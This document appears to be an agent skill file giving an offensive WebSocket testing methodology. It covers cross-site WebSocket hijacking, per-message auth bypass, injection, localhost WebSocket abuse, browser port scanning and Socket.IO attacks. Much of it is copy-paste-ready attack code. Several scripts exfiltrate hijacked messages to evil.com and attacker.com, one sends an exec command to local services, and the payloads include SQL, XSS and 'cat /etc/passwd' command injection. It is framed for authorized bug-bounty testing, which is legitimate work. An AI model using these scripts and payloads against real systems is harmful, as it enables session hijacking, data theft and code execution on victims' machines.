---
name: websocket-attacks
description: ULTIMATE WebSocket attack methodology — CSWSH, auth bypass, message injection, localhost WebSocket abuse, browser port discovery, WS hijacking.
category: meta-orchestration
---

# WebSocket Attacks — Comprehensive Methodology

## 1. Cross-Site WebSocket Hijacking (CSWSH)

CSWSH occurs when a WebSocket endpoint does not validate the Origin header during the handshake and relies on session cookies or ambient authentication. An attacker can host a malicious page that opens a WebSocket connection to the target in the victim's browser, inheriting the victim's cookies.

### Detection
- Intercept the WebSocket upgrade request in Burp.
- Inspect the Origin header. If it matches the target but is not validated, or if the header is absent/mirrored, CSWSH may be possible.
- Check for missing anti-CSRF tokens on the handshake or subscription messages.
- Check if the connection relies on ambient authentication such as cookies, HTTP Basic, or client certificates.

### Testing Steps
1. Remove the Origin header from the upgrade request. If the server still accepts the connection, it is likely not enforcing origin checks.
2. Change the Origin header to an attacker-controlled domain. If the handshake succeeds, the vulnerability is confirmed.
3. If cookie-based session auth is used and SameSite is not Strict, the browser will transmit cookies cross-origin.
4. Test with a null Origin (Origin: null). Some servers accept this for local file origins, which can be weaponized via sandboxed iframe or data URL.

### PoC JavaScript for CSWSH
```javascript
// Attacker page hosted on https://evil.com
const ws = new WebSocket("wss://target.com/chat");
ws.onopen = () => {
    console.log("Connected");
    ws.send(JSON.stringify({ action: "join", room: "general" }));
};
ws.onmessage = (event) => {
    // Exfiltrate received messages to attacker
    fetch("https://evil.com/exfil?d=" + btoa(event.data));
};
ws.onerror = (e) => console.error(e);
```
Place this script on a domain you control and trick a logged-in victim into visiting the page. If messages arrive and contain sensitive data, you have proven hijacking.

### Impact
- Real-time message interception of private channels.
- Impersonation of the victim in chat, trading, admin dashboards, or command channels.
- Data exfiltration without CORS restrictions affecting the WebSocket channel.
- Potential account takeover if the WS channel allows sensitive actions.

### Mitigation Notes for Testing
- Do not report missing Origin alone. Prove session hijacking plus actual data exfiltration.
- Show that the attacker page can subscribe to privileged channels and read messages.
- Show that the victim's cookies were transmitted cross-origin to the WS endpoint.

## 2. WebSocket Auth Checked Only at Connect, Not Per-Message

Many applications authenticate the user during the WebSocket handshake but fail to re-authorize actions within each message. This enables lateral movement and privilege abuse after the initial connection.

### Detection
- Capture a legitimate session upgrade request and extract the auth cookie or token.
- Open a new WebSocket connection with a low-privilege user token.
- Send administrative or sensitive messages that are normally restricted.

### Testing Steps
1. Connect two different users, for example standard and admin, and compare their abilities.
2. Intercept and replay messages from the admin session into the standard user's socket.
3. If the standard user can execute admin messages without a fresh auth check, per-message auth is missing.
4. Document the exact message structure that bypasses authorization.
5. Test role or tenant field manipulation inside the WS message itself.

### Example Attack Payload
```json
{
  "type": "command",
  "role": "admin",
  "cmd": "listUsers"
}
```
If the server processes this without validating that the sender actually holds the admin role, it is a vertical privilege escalation.

### Impact
- Horizontal privilege escalation: user A can read user B's data by tweaking an ID field.
- Vertical privilege escalation: standard user can execute admin commands.
- Cross-tenant access: switching tenantId inside a WS message to access other organizations' data.

## 3. Message Injection

Because WebSocket messages often pass through the same server-side handlers as HTTP request bodies, they can carry injection vulnerabilities.

### SQL Injection via WS Messages
- If incoming messages are concatenated into raw SQL queries, inject payloads inside JSON string values.
- Example payload:
```json
{ "search": "test' UNION SELECT username,password FROM users--" }
```
- Use standard time-based or error-based SQLi techniques adapted for JSON framing.
- If the WS server uses GraphQL subscriptions, try introspection and SQLi via GraphQL-over-WS.
- Confirm data extraction or a clear database error as evidence.

### Cross-Site Scripting (XSS) via WS Messages
- If messages are rendered onto a page without output encoding, send a payload such as:
```json
{ "message": "<img src=x onerror=alert(document.domain)>" }
```
- Confirm that other participants in the channel trigger the payload when receiving the broadcast.
- Stored XSS via WebSocket has high impact because it can affect every connected user in real-time.
- Test DOM-based XSS where the client-side JS uses innerHTML or eval on WS data without sanitization.
- Also test mXSS by sending payloads with null bytes or unusual encodings to bypass filters.

### Command Injection via WS Messages
- If the server passes message fields directly into shell commands, inject command separators.
- Example:
```json
{ "filename": "report.pdf; cat /etc/passwd" }
```
- Look for system responses or timing changes that indicate command execution.
- Test for template injection inside WS messages if the server uses string formatting.
- For blind command injection, use DNS callbacks or sleep delays to confirm execution.

### Testing Steps
1. Fuzz every message field with standard injection payloads from wordlists.
2. Observe server-side responses, WebSocket message broadcasts, and backend behavior.
3. If the server reflects parts of the message, test for XSS immediately.
4. If the server queries a database based on message content, test for SQL injection.
5. If the server executes system operations, test for command injection.
6. Use time delays and out-of-band callbacks to confirm blind injection.
7. Document the exact field and payload that triggered the vulnerability.

## 4. Information Disclosure via WebSocket

WebSockets often leak verbose errors, internal paths, tokens, and user data in ways that are invisible to standard HTTP scanning.

### Detection
- Join every available channel or namespace without proper authorization.
- Send malformed messages and observe error replies.
- Monitor traffic for tokens such as JWT, API keys, or session IDs transmitted in either direction.
- Listen for heartbeat or status messages that leak internal state.
- Check for WebSocket-specific diagnostic endpoints like /ws/debug or /socket.io/admin.

### Testing Steps
1. Send invalid JSON and watch for stack traces revealing file paths or internal code.
2. Request non-existent channels or topics and inspect error messages, comparing "Channel not found" versus "Access denied".
3. Look for user enumeration: send messages referencing different user IDs and compare response differences.
4. Check for GraphQL-over-WebSocket introspection queries:
```json
{ "type": "connection_init" }
{ "type": "subscribe", "id": "1", "payload": { "query": "{ __schema { types { name } } }" } }
```
5. Log all leaked tokens, paths, and error strings for chaining into further attacks.
6. Listen for system events such as join or leave notifications that reveal internal usernames or roles.
7. Intercept the upgrade handshake for any custom headers or tokens sent by the server.

### Impact
- Leakage of authentication tokens enabling session hijacking.
- Exposure of internal architecture and file paths.
- User enumeration leading to targeted brute-force or social engineering.

## 5. Localhost WebSocket Abuse (Browser-Based RCE via WS to Local Service)

Applications running on localhost sometimes expose a WebSocket server for inter-process communication. If the browser can be forced to connect to ws://127.0.0.1 on a specific port, an attacker may be able to send arbitrary commands to a local service.

### Detection
- Identify whether the target application installs a local companion service such as desktop apps, game clients, or printer utilities.
- Scan the user's localhost from the browser using WebSocket connection attempts.
- Check for Electron apps, VS Code extensions, or local development servers that expose WS.

### Testing Steps
1. Trick the victim into visiting an attacker page that attempts to open a WebSocket to ws://127.0.0.1 on a target port.
2. Iterate common ports: 3000, 8080, 9090, 5000, 8000, 9229, 4200, 9000.
3. If a connection succeeds, send known message formats, for example JSON commands often used by Electron apps.
4. Look for execution primitives such as open, exec, run, or shell events.
5. Try sending malformed messages to crash the local service as a potential DoS or RCE pivot.
6. Check if the local service allows file operations, command execution, or privilege escalation.

### Example PoC
```javascript
const ports = [3000, 8080, 9090, 9229];
ports.forEach(port => {
    try {
        const ws = new WebSocket("ws://127.0.0.1:" + port);
        ws.onopen = () => {
            ws.send(JSON.stringify({ cmd: "exec", args: ["calc.exe"] }));
        };
        ws.onmessage = (evt) => {
            fetch("https://evil.com/exfil?port=" + port + "&data=" + btoa(evt.data));
        };
    } catch(e) {}
});
```
If the local service accepts commands without authentication, this can lead to Local Code Execution.

### Impact
- Local privilege escalation.
- Arbitrary command execution on the victim machine via a web page.
- Bypass of network segmentation by using the browser as a bridge.

## 6. Browser Port Discovery via WebSocket Timing

When attempting to connect to a non-listening port, the browser throws a connection error almost instantly. If the port is filtered by a firewall, the connection may time out. This timing differential allows port scanning from the browser.

### Detection
- Host a malicious page that measures how long a new WebSocket takes to fire onerror or onclose.
- Compare timing against known open and closed ports to establish a baseline.

### Testing Steps
1. Loop through a port range using WebSocket attempts.
2. Measure the duration until the error event triggers.
3. If the duration is significantly longer than a closed port, the port may be filtered or open but rejecting the WebSocket handshake.
4. Use Promise.all with multiple simultaneous connections for faster scanning.
5. Document ports that respond unusually for follow-up manual testing.

### Example PoC
```javascript
async function scanPort(ip, port) {
    return new Promise(resolve => {
        const start = performance.now();
        const ws = new WebSocket("ws://" + ip + ":" + port);
        ws.onerror = ws.onclose = () => {
            resolve(performance.now() - start);
        };
        setTimeout(() => resolve(-1), 5000);
    });
}
```
Use this information to map internal services reachable from the victim's browser.

### Impact
- Reconnaissance of internal network services from the victim's browser.
- Discovery of hidden admin panels, APIs, or debugging interfaces.
- Enumeration of localhost services that can be abused for RCE.

## 7. Socket.IO Attacks

Socket.IO extends WebSockets with namespaces, rooms, and event-based messaging. Weaknesses often appear in namespace admission and event handling.

### Namespace Abuse
- Connect to restricted namespaces such as /admin or /debug without authorization.
- If the server does not check permissions per namespace, you gain access to administrative events.
- Probe for hidden namespaces using common names like /admin, /debug, /monitor, /internal.

### Auth Bypass
- Some Socket.IO implementations send an auth object during connection. Fuzz fields such as token, role, and userId.
- Example:
```javascript
const socket = io("https://target.com/admin", {
    auth: { token: "fake", role: "admin", userId: 1 }
});
```
- Also test connection-level auth vs room-level auth. A valid connection may not guarantee room access.

### Event Injection
- Once connected, emit events that should be restricted. If the server does not check the sender's role for each event, arbitrary actions can be triggered.
- Example:
```javascript
socket.emit("admin:deleteUser", { userId: 5 });
socket.emit("system:restart", { target: "production" });
```
- Listen for all events using socket.onAny() to discover hidden event names.

### Testing Steps
1. Enumerate all namespaces by probing common names.
2. Attempt to join each namespace with modified auth payloads.
3. Emit every known event with varying roles and document which bypass authorization.
4. Listen for broadcast events that leak data to unintended participants.
5. Test if rooms can be joined without proper authorization by manipulating join messages.

## 8. WebSocket Message Format Fuzzing

Servers may behave differently depending on whether the payload is JSON, raw string, or binary. Systematic format fuzzing can expose parser bugs, deserialization flaws, and unexpected routing.

### JSON Fuzzing
- Send malformed JSON such as missing braces, arrays instead of objects, null bytes inside strings.
- Change data types: pass integers where strings are expected, objects where booleans are expected.
- Inject duplicate keys and observe parser behavior (first-wins vs last-wins).
- Use extremely nested structures to test for stack exhaustion.
- Mix Unicode escapes and control characters inside JSON strings.

### Raw String Fuzzing
- Send plain text instead of JSON if the server expects JSON.
- Send extremely long strings to test for buffer issues or truncation leaks.
- Include CRLF sequences to test for message framing errors or HTTP header injection inside WS frames.
- Use template syntax like {{7*7}} to test for server-side template injection.
- Send XML payloads even when JSON is expected to test for XXE or SOAP processing behind the WS facade.

### Binary Fuzzing
- Send binary frames with varying lengths and opcodes.
- Combine binary and text frames in the same stream.
- If the server does not validate opcode or frame type, binary data may reach unsafe handlers.
- Send fragmented frames and observe reassembly behavior.
- Use the reserved bits in the WebSocket frame header to test for parser confusion.

### Testing Steps
1. Baseline: send a valid message and record the response.
2. Systematically mutate the payload format while keeping semantic intent similar.
3. Watch for crashes, verbose errors, or behavioral changes in message routing.
4. If the server parses binary as text or vice versa, fuzz for serialization vulnerabilities.
5. Log any parser error messages that leak internal implementation details.

## 9. WSS Secure vs WS Testing

Always test both ws and wss endpoints. A downgrade from encrypted to unencrypted can expose sensitive data and bypass mixed-content protections in some contexts.

### Mixed Content Downgrade
- If the web application loads over HTTPS but attempts to connect to ws, modern browsers block the connection.
- However, if the user is using a non-secure context such as intranet or localhost, ws may succeed.
- Check whether the server accepts unencrypted WebSocket handshakes alongside encrypted ones.

### Certificate Validation
- If testing from a controlled environment, use a proxy with a self-signed certificate.
- If the application still connects, it may be skipping TLS verification.
- Look for custom certificate pinning that can be bypassed with Frida or SSL Kill Switch.

### Testing Steps
1. For every wss endpoint discovered, attempt ws on the same host and port.
2. Check if sensitive data is transmitted over the unencrypted channel.
3. Document whether mixed-content policies prevent the downgrade, or if the server actively redirects or rejects ws.
4. Test for HSTS bypass by attempting ws from a subdomain without HSTS.

## 10. Tool Methodology

Manual and automated tools are essential for efficient WebSocket testing. The following tools cover interactive testing, scripting, and proxy-based analysis.

### wscat
- Interactive WebSocket client for manual exploration.
- Install: npm install -g wscat
- Example session:
```bash
wscat -c wss://target.com/socket
Connected (press CTRL+C to quit)
> {"action":"ping"}
< {"action":"pong"}
```
- Use for rapid manual message testing and schema discovery.
- Supports headers via --header flag for auth tokens or custom Origin.

### websocat
- Powerful CLI tool supporting headers, custom HTTP methods, scripting, and piping.
- Install via cargo or download binary.
- Example with forged Origin header:
```bash
websocat -H "Origin: https://evil.com" wss://target.com/socket
```
- Useful for CSWSH testing by forging the Origin header.
- Supports sending from stdin or file, enabling automated fuzzing pipelines.
- Can act as a WebSocket server for local testing of client behavior.

### Burp WebSocket History
- Intercept and replay WebSocket messages via Burp's WebSocket tab.
- Use Repeater to modify individual messages and observe server reactions in real-time.
- Filter history by target host to isolate relevant traffic.
- Export full message sequences for evidence collection.
- Combine with Intruder for automated message fuzzing by targeting specific fields.

### OWASP ZAP
- Can intercept and fuzz WebSocket traffic natively.
- Provides a WebSocket tab similar to Burp for manual inspection.
- Supports scripting via ZAP API for automated message replay.
- Useful for regression testing and CI-CD integration.

### mitmproxy
- Script WebSocket flows in Python for full automation.
- Example script: intercept all messages, log them, and modify specific payloads on the fly.
- Supports TLS interception for wss endpoints when the test client trusts the proxy CA.
- Can be combined with custom response handlers to simulate server replies.

### Recon and Discovery Tools
- Use browser DevTools Network tab to identify ws/wss connections.
- Leverage LinkFinder or JS analysis tools to discover hardcoded WS endpoints.
- Use EyeWitness or gowitness to capture screenshots of pages that initialize WS connections.

## 11. PoC JavaScript for CSWSH

A complete, copy-paste-ready PoC to demonstrate CSWSH impact with private channel subscription and exfiltration.

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
(async function() {
    const target = "wss://target.com/realtime";
    const exfil = "https://attacker.com/log?m=";
    const ws = new WebSocket(target);
    ws.onopen = function() {
        ws.send(JSON.stringify({ subscribe: ["private", "notifications", "admin-alerts"] }));
    };
    ws.onmessage = function(evt) {
        fetch(exfil + encodeURIComponent(btoa(evt.data)));
    };
    ws.onerror = function(err) {
        fetch(exfil + "error");
    };
})();
</script>
</body>
</html>
```
Host this file and have an authenticated victim open it. If private messages are forwarded to the attacker server, the bug is proven.

### Variations
- For Socket.IO targets, use the Socket.IO client library instead of native WebSocket.
- For targets requiring a specific subprotocol, set the second argument in the WebSocket constructor.
- If the server rejects unexpected Origin values, try sandboxed iframe tricks to create a null Origin.

## 12. Evidence Collection Format

Every WebSocket finding must be documented with a standardized evidence set so reproduction is simple and triagers can verify the impact without guesswork.

### Required Evidence Files
```
exploit/WS-CSWSH-001/
  finding-summary.md      - One-line title, endpoint, impact
  steps-to-reproduce.md   - Exact commands, clicks, and payloads
  handshake-request.txt   - Raw HTTP upgrade request with headers
  handshake-response.txt  - Server upgrade response
  injected-message.txt    - Exact malicious WS message sent
  server-response.txt     - Exact server WS message received
  screenshot.png          - Visual proof of impact (browser, terminal)
  poc.html                - Self-contained reproduction HTML file
  network-trace.har       - Browser network export showing WS frames
```

### handshake-request.txt Example
```
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://evil.com
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### injected-message.txt Example
```json
{
  "action": "join",
  "channel": "admin-alerts"
}
```

### server-response.txt Example
```json
{
  "status": "joined",
  "channel": "admin-alerts",
  "messages": ["Server reboot scheduled", "New admin: bob"]
}
```

### Evidence Quality Rules
- Reproduce from a fresh browser profile with no cached state.
- Include timestamps in screenshots and terminal recordings.
- Show the full HTTP request and response headers, not just bodies.
- If using Burp, include the WebSocket Repeater tab in screenshots.
- The poc.html must work when opened by a triager with no modifications.
- Redact only truly sensitive data; overly redacted evidence looks suspicious.

### Impact Demonstration Requirements
- For CSWSH: show actual exfiltrated messages from a private channel.
- For auth bypass: show a low-priv user executing a high-priv action.
- For injection: show the output or behavior change caused by the payload.
- For info disclosure: show the leaked token, path, or data in context.
- For localhost abuse: show a command executed on the local machine.
